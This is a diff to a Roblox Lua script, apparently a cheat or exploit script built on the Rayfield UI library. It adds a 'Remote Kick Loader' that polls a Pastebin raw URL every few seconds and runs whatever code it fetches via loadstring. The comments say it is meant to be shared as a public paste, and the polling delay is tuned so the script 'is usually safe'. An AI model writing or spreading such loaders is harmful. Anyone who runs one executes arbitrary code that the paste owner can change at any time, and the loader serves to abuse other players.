@@ -1,10 +1,34 @@
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
-local on = true  -- Change this to false to stop printing
+-- Remote Kick Loader - always fetches fresh paste every ~3 seconds
+-- Put THIS in your public paste / share link
 
-while on do
-    loadstring(game:HttpGet("https://pastebin.com/raw/NmZAr6zi", true))()
-    task.wait(1)  -- Waits 1 second
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+
+local KICK_URL = "https://pastebin.com/raw/NmZAr6zi"  -- change this
+
+while true do
+    local success, code = pcall(function()
+        return HttpService:GetAsync(KICK_URL, true)
+    end)
+    
+    if success and code and code ~= "" then
+        local fn, err = loadstring(code)
+        if fn then
+            local ok, kickErr = pcall(fn)
+            if not ok then
+                warn("Kick script error: " .. tostring(kickErr))
+            end
+        else
+            warn("Loadstring failed: " .. tostring(err))
+        end
+    else
+        warn("Failed to fetch kick script")
+    end
+    
+    task.wait(3)  -- adjust delay (2–5s is usually safe)
 end
 
 local Window = Rayfield:CreateWindow({
